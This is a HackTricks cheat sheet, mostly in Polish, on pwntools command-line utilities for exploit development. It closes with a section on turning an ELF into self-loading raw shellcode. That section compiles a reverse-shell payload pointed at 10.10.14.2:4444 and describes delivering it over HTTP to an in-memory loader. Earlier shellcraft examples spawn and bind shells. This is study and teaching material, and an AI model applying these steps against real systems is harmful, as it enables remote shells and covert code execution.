# PwnTools

{{#include ../../../banners/hacktricks-training.md}}
```
pip3 install pwntools
```
## Pwn asm

Pobierz **opcodes** z linii lub pliku.
```
pwn asm "jmp esp"
pwn asm -i <filepath>
```
**Można wybrać:**

- typ wyjścia (raw,hex,string,elf)
- kontekst pliku wyjściowego (16,32,64,linux,windows...)
- unikać bajtów (new lines, null, a list)
- wybierz encoder, debuguj shellcode przy użyciu gdb, uruchom wynik

## **Pwn checksec**

Skrypt checksec
```
pwn checksec <executable>
```
## Pwn constgrep

## Pwn cyclic

Pobierz pattern
```
pwn cyclic 3000
pwn cyclic -l faad
```
**Możesz wybrać:**

- Używany alfabet (domyślnie małe litery)
- Długość unikalnego wzorca (domyślnie 4)
- kontekst (16,32,64,linux,windows...)
- Podaj offset (-l)

## Pwn debug

Dołącz GDB do procesu
```
pwn debug --exec /bin/bash
pwn debug --pid 1234
pwn debug --process bash
```
**Można wybrać:**

- Według executable, według nazwy lub według pid context (16,32,64,linux,windows...)
- gdbscript do uruchomienia
- sysrootpath

## Pwn disablenx

Wyłącz nx dla binary
```
pwn disablenx <filepath>
```
## Pwn disasm

Disasembluje hex opcodes
```
pwn disasm ffe4
```
**Można wybrać:**

- context (16,32,64,linux,windows...)
- adres bazowy
- kolor (domyślny)/bez koloru

## Pwn elfdiff

Wyświetla różnice między 2 plikami
```
pwn elfdiff <file1> <file2>
```
## Pwn hex

Uzyskaj reprezentację szesnastkową
```bash
pwn hex hola #Get hex of "hola" ascii
```
## Pwn phd

Pobierz hexdump
```
pwn phd <file>
```
**Można wybrać:**

- Liczba bajtów do wyświetlenia
- Liczba bajtów na linię; bajt do podświetlenia
- Pomiń bajty na początku

## Pwn pwnstrip

## Pwn scrable

## Pwn shellcraft

Pobierz shellcodes
```
pwn shellcraft -l #List shellcodes
pwn shellcraft -l amd #Shellcode with amd in the name
pwn shellcraft -f hex amd64.linux.sh #Create in C and run
pwn shellcraft -r amd64.linux.sh #Run to test. Get shell
pwn shellcraft .r amd64.linux.bindsh 9095 #Bind SH to port
```
**Można wybrać:**

- shellcode i jego argumenty
- plik wyjściowy
- format wyjścia
- debug (attach dbg do shellcode)
- before (debug trap przed kodem)
- after
- avoid using opcodes (domyślnie: bez null i new line)
- Uruchom shellcode
- Kolor/bez koloru
- lista syscalls
- lista możliwych shellcodes
- Wygeneruj ELF jako bibliotekę współdzieloną

## Szablon Pwn

Pobierz pythonowy szablon
```
pwn template
```
**Można wybrać:** host, port, user, pass, path i quiet

## Pwn unhex

Z hex do stringu
```
pwn unhex 686f6c61
```
## Pwn aktualizacja

Aby zaktualizować pwntools
```
pwn update
```
## ELF → raw shellcode packaging (loader_append)

Pwntools może przekształcić samodzielny ELF w pojedynczy raw shellcode blob, który sam mapuje swoje segmenty i przekazuje wykonanie do oryginalnego punktu wejścia. Jest to idealne dla memory‑only loaderów (np. aplikacje Android wywołujące JNI do wykonania pobranych bajtów).

Typical pipeline (amd64 example)

1) Zbuduj statyczny, niezależny od pozycji payload ELF (musl recommended for portability):
```bash
musl-gcc -O3 -s -static -o exploit exploit.c \
-DREV_SHELL_IP="\"10.10.14.2\"" -DREV_SHELL_PORT="\"4444\""
```
2) Konwertuj ELF → shellcode za pomocą pwntools:
```python
# exp2sc.py
from pwn import *
context.clear(arch='amd64')
elf = ELF('./exploit')
sc = asm(shellcraft.loader_append(elf.data, arch='amd64'))
open('sc','wb').write(sc)
print(f"ELF size={len(elf.data)} bytes, shellcode size={len(sc)} bytes")
```
3) Dostarcz sc do loadera pamięci (np. przez HTTP[S]) i wykonaj w procesie.

Uwagi
- loader_append embeds the original ELF program into the shellcode and emits a tiny loader that mmaps the segments and jumps to the entry.
- Określ wyraźnie architekturę za pomocą context.clear(arch=...). arm64 jest powszechny na Android.
- Utrzymuj kod payloadu niezależny od pozycji (position‑independent) i unikaj założeń dotyczących ASLR/NX procesu.

## Referencje

- [Pwntools](https://docs.pwntools.com/en/stable/)
- [CoRPhone – ELF→shellcode pipeline used for Android in-memory execution](https://github.com/0xdevil/corphone)

{{#include ../../../banners/hacktricks-training.md}}
